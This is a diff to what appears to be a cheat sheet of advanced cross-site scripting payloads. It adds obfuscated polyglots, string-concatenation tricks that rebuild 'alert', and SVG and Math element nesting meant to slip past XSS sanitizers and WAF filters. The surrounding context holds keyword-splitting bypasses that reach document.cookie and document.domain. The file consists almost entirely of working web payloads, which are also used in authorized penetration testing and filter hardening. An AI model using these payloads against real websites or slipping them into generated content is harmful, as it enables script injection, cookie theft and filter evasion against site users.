@@ -43,6 +43,10 @@ Advanced XSS Payloads:
 ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
 <​script>a="import\x28"<​/script> <​script>b="`//0-a\x2e"<​/script> <​script>c="nl`\x29"<​/script><​script>d=setTimeout<​/script><​script>e=eval<​/script><​script>f=`${a}${b}${c}`<​/script><​script>d`e\x28f\x29`<​/script>
 1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
+<img/src/onerror​=arguments[0].path.pop().['al'+'ert'](1)>
+JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
+d=document,b='`',d['loca'+'tion']='javascript​&colon;aler'+'t'+b+domain+b
+%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
 
 
 
@@ -123,5 +127,22 @@ keyword not allowed "><body onbefore scriptexecute="b='a';location='jav'+b+' scr
 Keywords such as confirm, alert, prompt, document. were blocked. The same technique can be used to concatenate these keywords:
 "><BODY onbeforescriptexecute="x1='cookie'; c=') '; b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'+x1+c">
 Result: location="javascript:confirm(document.domain)"
+
+
+<!-- You can hide your XSS payload inside SVG or Math element to bypass the XSS Sanitizer or WAF filter. -->
+<svg>
+  <style>
+    <script>alert(1)</script>
+  </style>
+</svg>
+
+<math>
+  <style>
+    <img src onerror=alert (2)>
+  </style>
+</math>
+
+
+
 
 
